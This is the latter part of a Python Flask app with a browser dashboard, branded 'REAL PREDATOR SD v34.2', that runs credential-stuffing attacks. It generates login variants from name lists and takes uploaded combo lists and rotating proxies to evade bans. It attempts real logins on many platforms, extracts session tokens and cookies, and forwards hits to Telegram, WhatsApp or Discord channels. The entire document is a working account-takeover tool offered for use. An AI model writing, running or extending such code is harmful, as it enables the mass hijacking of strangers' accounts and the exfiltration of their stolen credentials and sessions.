            <div class="config-row" style="flex:1;min-width:200px;">
                <label><i class="fas fa-network-wired"></i> Proxy:</label>
                <textarea id="proxyInput" placeholder="proxy:port" style="height:30px;font-size:9px;flex:1;min-width:100px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;padding:4px;"></textarea>
                <button class="btn" id="proxyApplyBtn" style="padding:4px 12px;font-size:10px;">Apply</button>
                <span id="proxyCount" style="color:#006622;font-size:9px;">0</span>
            </div>
        </div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#00cc33;display:flex;gap:10px;margin-bottom:6px;">
            <span><i class="fas fa-broadcast"></i> FEED <span style="font-size:9px;color:#006622;" id="feedCount">(0)</span></span>
        </div>
        <div class="feed-container" id="feedContainer"><div class="empty-state">⏳ Waiting for activity...</div></div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#ffd700;display:flex;gap:10px;margin-bottom:6px;">
            <span><i class="fas fa-database"></i> HITS <span style="font-size:9px;color:#006622;" id="resultCount">(0)</span></span>
            <span style="font-size:9px;color:#ffd700;">🎮 Gaming</span>
            <span style="font-size:9px;color:#0088cc;">📄 Files</span>
        </div>
        <div class="result-container" id="resultContainer"><div class="empty-state">📭 No hits yet</div></div>
    </div>

    <div style="text-align:center;padding:10px;color:#006622;font-size:8px;border-top:1px solid rgba(0,255,65,0.05);margin-top:10px;">
        ⚡ REAL PREDATOR SD v34.2 | {{ platforms|length }} Platforms | Tokens + Cookies as Files | @MRDPY
    </div>
</div>

<script>
const $ = id => document.getElementById(id);

async function api(endpoint, method='GET', data=null) {
    const opts = { method, headers: { 'Content-Type': 'application/json' } };
    if (data) opts.body = JSON.stringify(data);
    try {
        const res = await fetch(endpoint, opts);
        return await res.json();
    } catch (e) {
        console.error('API Error:', e);
        return { success: false, error: e.message };
    }
}

// ================================================================
// GENERATE & TEST
// ================================================================
document.getElementById('generateBtn').addEventListener('click', async function() {
    const names = document.getElementById('namesInput').value;
    if (!names.trim()) {
        alert('⚠️ Please paste some names first!');
        return;
    }
    
    const btn = this;
    btn.disabled = true;
    btn.textContent = '⏳ Generating...';
    document.getElementById('stopGenerationBtn').disabled = false;
    document.getElementById('genStatus').textContent = '🔄 Generating variations...';
    document.getElementById('genStatus').style.color = '#ffd700';
    
    const res = await api('/api/generate/accounts', 'POST', { names: names });
    
    if (res.success) {
        document.getElementById('genStatus').textContent = '✅ Ready - ' + res.count + ' accounts generated';
        document.getElementById('genStatus').style.color = '#00ff41';
        document.getElementById('genCount').textContent = '📊 ' + res.count + ' generated';
        
        await api('/api/start', 'POST', { mode: 'generation' });
        
        document.getElementById('statusBadge').className = 'status-badge running';
        document.getElementById('statusDot').className = 'status-dot running';
        document.getElementById('statusText').textContent = 'RUNNING';
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        
        setTimeout(() => {
            btn.disabled = false;
            btn.textContent = '<i class="fas fa-cogs"></i> GENERATE & TEST';
        }, 2000);
    } else {
        alert('❌ Error: ' + (res.error || 'Unknown'));
        btn.disabled = false;
        btn.textContent = '<i class="fas fa-cogs"></i> GENERATE & TEST';
        document.getElementById('genStatus').textContent = '❌ Failed';
        document.getElementById('genStatus').style.color = '#ff0044';
    }
});

document.getElementById('stopGenerationBtn').addEventListener('click', async function() {
    await api('/api/stop', 'POST');
    document.getElementById('statusBadge').className = 'status-badge stopped';
    document.getElementById('statusDot').className = 'status-dot stopped';
    document.getElementById('statusText').textContent = 'OFF';
    document.getElementById('startBtn').disabled = false;
    document.getElementById('stopBtn').disabled = true;
    this.disabled = true;
    document.getElementById('genStatus').textContent = '⏹️ Stopped';
    document.getElementById('genStatus').style.color = '#ff0044';
});

// ================================================================
// Apply Target
// ================================================================
document.getElementById('applyTargetBtn').addEventListener('click', async function() {
    const platform = document.getElementById('targetPlatform').value;
    const res = await api('/api/target', 'POST', { platform: platform });
    if (res.success) {
        document.getElementById('targetStatus').textContent = platform ? '🎯 ' + platform : '⚪ Random';
        document.getElementById('targetStatus').style.color = platform ? '#ffd700' : '#006622';
    }
});

// ================================================================
// Test Bot
// ================================================================
document.getElementById('testBotBtn').addEventListener('click', async function() {
    const btn = this;
    const resultDiv = document.getElementById('testResult');
    btn.disabled = true;
    btn.textContent = '⏳ Testing...';
    resultDiv.style.display = 'none';
    
    const res = await api('/api/test/bot', 'POST');
    
    if (res.success) {
        resultDiv.className = 'test-result success';
        resultDiv.textContent = '✅ ' + res.message;
    } else {
        resultDiv.className = 'test-result failed';
        resultDiv.textContent = '❌ ' + (res.error || 'Connection failed');
    }
    resultDiv.style.display = 'inline-block';
    
    setTimeout(() => {
        resultDiv.style.display = 'none';
    }, 8000);
    
    btn.disabled = false;
    btn.textContent = '📨 Test Bot';
});

// ================================================================
// Combo File Upload
// ================================================================
document.getElementById('comboFile').addEventListener('change', function(e) {
    if (this.files.length > 0) {
        document.getElementById('comboName').textContent = this.files[0].name;
        const reader = new FileReader();
        reader.onload = async function(ev) {
            await api('/api/upload/combo', 'POST', { content: ev.target.result });
        };
        reader.readAsText(this.files[0]);
    }
});

// ================================================================
// Proxy Upload
// ================================================================
document.getElementById('proxyApplyBtn').addEventListener('click', async function() {
    const content = document.getElementById('proxyInput').value;
    if (!content.trim()) { alert('Enter proxies'); return; }
    const res = await api('/api/upload/proxy', 'POST', { content: content });
    if (res.success) {
        document.getElementById('proxyCount').textContent = res.count;
        alert('✅ Applied ' + res.count + ' proxies');
    }
});

// ================================================================
// Group Config
// ================================================================
document.getElementById('configGroupBtn').addEventListener('click', async function() {
    const data = {
        telegram_token: document.getElementById('tgToken').value,
        telegram_chat_id: document.getElementById('tgChatId').value,
        whatsapp_group_id: document.getElementById('waGroupId').value,
        discord_webhook: document.getElementById('dcWebhook').value
    };
    const res = await api('/api/group/config', 'POST', data);
    if (res.success) {
        document.getElementById('groupStatus').textContent = res.enabled ? '✅ Enabled' : '⚪ Disabled';
        document.getElementById('groupStatus').style.color = res.enabled ? '#00ff41' : '#006622';
        alert('✅ Group config applied!');
    }
});

// ================================================================
// Start / Stop
// ================================================================
document.getElementById('startBtn').addEventListener('click', async function() {
    const speed = parseInt(document.getElementById('speedInput').value) || 8;
    const target = document.getElementById('targetPlatform').value;
    const data = { speed, target };
    const res = await api('/api/start', 'POST', data);
    if (res.success) {
        document.getElementById('statusBadge').className = 'status-badge running';
        document.getElementById('statusDot').className = 'status-dot running';
        document.getElementById('statusText').textContent = 'RUNNING';
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
    } else {
        alert('❌ Failed: ' + (res.error || 'Unknown error'));
    }
});

document.getElementById('stopBtn').addEventListener('click', async function() {
    const res = await api('/api/stop', 'POST');
    if (res.success) {
        document.getElementById('statusBadge').className = 'status-badge stopped';
        document.getElementById('statusDot').className = 'status-dot stopped';
        document.getElementById('statusText').textContent = 'OFF';
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
    }
});

// ================================================================
// Clear
// ================================================================
document.getElementById('clearBtn').addEventListener('click', async function() {
    if (!confirm('Clear all results?')) return;
    await api('/api/clear', 'POST');
});

// ================================================================
// Update Stats
// ================================================================
async function updateStats() {
    try {
        const d = await api('/api/stats');
        if (!d.success) return;
        document.getElementById('statHits').textContent = d.hits || 0;
        document.getElementById('statBad').textContent = d.bad || 0;
        document.getElementById('statTotal').textContent = d.checked || 0;
        document.getElementById('statTesting').textContent = d.testing || 0;
        document.getElementById('statReal').textContent = d.real_checks || 0;
        document.getElementById('statGenerated').textContent = d.generated_count || 0;
        const total = d.checked || 0;
        const hits = d.hits || 0;
        const rate = total > 0 ? ((hits / total) * 100).toFixed(1) : 0;
        document.getElementById('statRate').textContent = rate + '%';
        document.getElementById('cpm').textContent = d.cpm || 0;
        document.getElementById('errorCount').textContent = d.errors || 0;
        document.getElementById('realCount').textContent = d.real_checks || 0;
        
        if (d.current_testing && d.current_testing.length > 0) {
            const ct = d.current_testing[0];
            document.getElementById('currentTesting').textContent = `${ct.platform} | ${ct.username} | ${ct.status === 'hit' ? '✅ HIT' : ct.status === 'bad' ? '❌ BAD' : '🔄 Testing'}`;
            document.getElementById('currentTesting').style.color = ct.status === 'hit' ? '#00ff41' : ct.status === 'bad' ? '#ff0044' : '#ffaa00';
        } else {
            document.getElementById('currentTesting').textContent = '⏳ Waiting...';
            document.getElementById('currentTesting').style.color = '#ffaa00';
        }
        
        if (d.running) {
            document.getElementById('statusBadge').className = 'status-badge running';
            document.getElementById('statusDot').className = 'status-dot running';
            document.getElementById('statusText').textContent = 'RUNNING';
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
        }
        
        if (d.start_time) {
            const elapsed = Math.floor((Date.now() - d.start_time) / 1000);
            const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
            const secs = String(elapsed % 60).padStart(2, '0');
            document.getElementById('statTime').textContent = mins + ':' + secs;
        }
    } catch (e) { console.error('Stats update error:', e); }
}

// ================================================================
// Update Feed
// ================================================================
async function updateFeed() {
    try {
        const d = await api('/api/feed');
        if (!d.success) return;
        const c = document.getElementById('feedContainer');
        if (!d.feed || d.feed.length === 0) {
            c.innerHTML = '<div class="empty-state">⏳ Waiting for activity...</div>';
            return;
        }
        c.innerHTML = d.feed.slice(0, 50).map(item => {
            const cls = item.type || 'info';
            return `<div class="feed-item ${cls}"><span class="time">${item.time || ''}</span><span>${item.text || ''}</span></div>`;
        }).join('');
        document.getElementById('feedCount').textContent = '(' + d.feed.length + ')';
    } catch (e) { console.error('Feed update error:', e); }
}

// ================================================================
// Update Results
// ================================================================
async function updateResults() {
    try {
        const d = await api('/api/results');
        if (!d.success) return;
        const c = document.getElementById('resultContainer');
        if (!d.results || d.results.length === 0) {
            c.innerHTML = '<div class="empty-state">📭 No hits yet - Start hunting!</div>';
            return;
        }
        c.innerHTML = d.results.slice(0, 50).map(item => {
            const cls = item.is_gaming ? 'result-item hit gaming' : 'result-item hit';
            const badge = item.is_gaming ? '<span class="gaming-badge">🎮</span>' : '';
            const tokenDisplay = item.token && item.token !== 'N/A' ? `<div class="token-display">📄 Token & Cookie saved as files</div>` : '';
            return `<div class="${cls}">${badge}${item.content}${tokenDisplay}</div>`;
        }).join('');
        document.getElementById('resultCount').textContent = '(' + d.results.length + ')';
    } catch (e) { console.error('Results update error:', e); }
}

// ================================================================
// Intervals
// ================================================================
setInterval(updateStats, 400);
setInterval(updateFeed, 600);
setInterval(updateResults, 700);

updateStats();
updateFeed();
updateResults();

console.log('✅ Dashboard loaded - v34.2');
console.log('✅ Tokens and Cookies sent as files');
console.log('✅ 2 attempts per account');
console.log('✅ Variety: Emails + Phones + Usernames');
console.log('✅ Real login with token/cookie extraction');
</script>
</body>
</html>'''

# ================================================================
# FLASK ROUTES
# ================================================================

@app.route('/')
def index():
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    password = request.json.get('password', '').strip()
    if password == ADMIN_PASSWORD:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid password'})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('index'))
    return render_template_string(DASHBOARD_TEMPLATE, platforms=PLATFORMS)

# ================================================================
# GENERATE ACCOUNTS FROM NAMES - WITH VARIETY
# ================================================================
@app.route('/api/generate/accounts', methods=['POST'])
def generate_accounts():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    names = request.json.get('names', '')
    if not names.strip():
        return jsonify({'success': False, 'error': 'No names provided'})
    
    predator.set_names_list(names)
    accounts = predator.generated_accounts
    
    if accounts:
        predator.add_combos(accounts)
        predator.generation_mode = True
        
        # إحصائيات
        emails = sum(1 for u, p in accounts if '@' in u)
        phones = sum(1 for u, p in accounts if re.search(r'^[\+]?[0-9]{7,15}$', u))
        usernames = len(accounts) - emails - phones
        
        return jsonify({
            'success': True,
            'count': len(accounts),
            'accounts': accounts[:10],
            'stats': {'emails': emails, 'phones': phones, 'usernames': usernames}
        })
    
    return jsonify({'success': False, 'error': 'No accounts generated'})

# ================================================================
# TEST BOT
# ================================================================
@app.route('/api/test/bot', methods=['POST'])
def test_bot():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    result = predator.group_sender.test_telegram()
    return jsonify(result)

# ================================================================
# TARGET
# ================================================================
@app.route('/api/target', methods=['POST'])
def set_target():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    platform = request.json.get('platform', '')
    predator.set_target_platform(platform if platform else None)
    return jsonify({'success': True, 'target': platform or 'Random'})

# ================================================================
# START / STOP
# ================================================================
@app.route('/api/start', methods=['POST'])
def start_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    if state['running']:
        return jsonify({'success': False, 'error': 'Already running'})
    
    data = request.json or {}
    
    if data.get('target'):
        predator.set_target_platform(data['target'])
    
    if data.get('mode') == 'generation' and predator.generation_mode:
        state['generation_mode'] = True
    
    state['running'] = True
    state['checked'] = 0
    state['hits'] = 0
    state['bad'] = 0
    state['errors'] = 0
    state['results'] = []
    state['feed'] = []
    state['current_testing'] = []
    state['start_time'] = datetime.now()
    state['cpm'] = 0
    state['generated_count'] = 0
    
    threading.Thread(target=predator_loop, daemon=True).start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['running'] = False
    predator.generation_mode = False
    return jsonify({'success': True})

# ================================================================
# STATS
# ================================================================
@app.route('/api/stats')
def get_stats():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    gaming_hits = 0
    for result in state['results']:
        platform_name = result.get('platform', '')
        platform_info = next((p for p in PLATFORMS if p['name'] == platform_name), None)
        if platform_info and platform_info.get('gaming'):
            gaming_hits += 1
    
    return jsonify({
        'success': True,
        'running': state['running'],
        'checked': state['checked'],
        'hits': state['hits'],
        'bad': state['bad'],
        'errors': state['errors'],
        'gaming': gaming_hits,
        'cpm': state.get('cpm', 0),
        'testing': len(state.get('current_testing', [])),
        'current_testing': state.get('current_testing', []),
        'start_time': int(state['start_time'].timestamp() * 1000) if state['start_time'] else None,
        'total': state.get('total', 0),
        'real_checks': predator.real_checks if hasattr(predator, 'real_checks') else 0,
        'generated_count': state.get('generated_count', 0)
    })

# ================================================================
# FEED
# ================================================================
@app.route('/api/feed')
def get_feed():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'feed': state['feed'][:80]})

# ================================================================
# RESULTS
# ================================================================
@app.route('/api/results')
def get_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    formatted_results = []
    for result in state['results'][:50]:
        platform_name = result.get('platform', '')
        platform_info = next((p for p in PLATFORMS if p['name'] == platform_name), None)
        is_gaming = platform_info.get('gaming', False) if platform_info else False
        
        formatted_results.append({
            'content': f"🎯 {platform_name} | 📧 {result.get('username', '')} | 🔑 {result.get('password', '')}",
            'is_gaming': is_gaming,
            'token': result.get('token', 'N/A')[:30] + '...' if len(result.get('token', '')) > 30 else result.get('token', 'N/A')
        })
    
    return jsonify({'success': True, 'results': formatted_results})

# ================================================================
# CLEAR
# ================================================================
@app.route('/api/clear', methods=['POST'])
def clear_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['results'] = []
    state['feed'] = []
    state['hits'] = 0
    state['bad'] = 0
    predator.results = []
    predator.feed = []
    predator.hits = 0
    predator.bad = 0
    return jsonify({'success': True})

# ================================================================
# UPLOAD COMBO
# ================================================================
@app.route('/api/upload/combo', methods=['POST'])
def upload_combo():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    content = request.json.get('content', '')
    combos = []
    
    for line in content.split('\n'):
        line = line.strip()
        if not line:
            continue
        if ':' in line:
            parts = line.split(':', 1)
            combos.append((parts[0].strip(), parts[1].strip()))
        elif '|' in line:
            parts = line.split('|', 1)
            combos.append((parts[0].strip(), parts[1].strip()))
        elif '@' in line:
            combos.append((line, ''))
        else:
            combos.append((line, ''))
    
    predator.add_combos(combos)
    return jsonify({'success': True, 'count': len(combos)})

# ================================================================
# UPLOAD PROXY
# ================================================================
@app.route('/api/upload/proxy', methods=['POST'])
def upload_proxy():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    proxies = [p.strip() for p in request.json.get('content', '').split('\n') if p.strip()]
    for proxy in proxies:
        predator.anti_ban.add_proxy(proxy)
    return jsonify({'success': True, 'count': len(proxies)})

# ================================================================
# GROUP CONFIG
# ================================================================
@app.route('/api/group/config', methods=['POST'])
def group_config():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    data = request.json or {}
    
    if data.get('telegram_token') and data.get('telegram_chat_id'):
        predator.group_sender.set_telegram(data['telegram_token'], data['telegram_chat_id'])
    
    if data.get('whatsapp_group_id'):
        predator.group_sender.set_whatsapp(data['whatsapp_group_id'])
    
    if data.get('discord_webhook'):
        predator.group_sender.set_discord(data['discord_webhook'])
    
    return jsonify({'success': True, 'enabled': predator.group_sender.enabled})

# ================================================================
# RUN
# ================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 4040))
    
    print("""
╔══════════════════════════════════════════════════════════════════════════╗
║   REAL PREDATOR SD v34.2 - ULTIMATE HUNTER                            ║
║   🔥 70+ Platforms with Token Extraction                             ║
║   ⚡ GENERATE ACCOUNTS FROM NAMES LIST - REAL LOGIN                 ║
║   ⚡ VARIETY: Emails + Phones + Usernames                           ║
║   ⚡ 2 ATTEMPTS ONLY: 1) Email+Pass 2) Username+Pass               ║
║   ⚡ TOKENS & COOKIES as FILES in Telegram                         ║
║   ⚡ High Risk: 10 min / 2 attempts                                 ║
║   ⚡ Low Risk: 5 min                                                ║
║   🎯 REAL Account Verification + Token/Cookie Extraction            ║
║   📢 Test Bot Button                                                 ║
║   📊 Real-Time Stats                                                 ║
║   📢 Group Sharing (Telegram/Discord)                               ║
║   🎮 Gaming Platforms Highlighted                                    ║
║   📱 Developer: @MRDPY                                               ║
║   💬 WhatsApp: +249907118667                                         ║
╚══════════════════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server: http://localhost:{port}")
    print(f"[*] Password: {ADMIN_PASSWORD}")
    print(f"[*] {len(PLATFORMS)} Platforms loaded")
    print(f"[*] GENERATION MODE: Paste names list -> Generate VARIETY (Emails+Phones+Usernames)")
    print(f"[*] 2 ATTEMPTS: 1) Original 2) Username only")
    print(f"[*] TOKENS & COOKIES: Sent as files in Telegram")
    print(f"[*] REAL LOGIN: Token and Cookie extraction on success")
    print(f"[*] All systems ready")
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
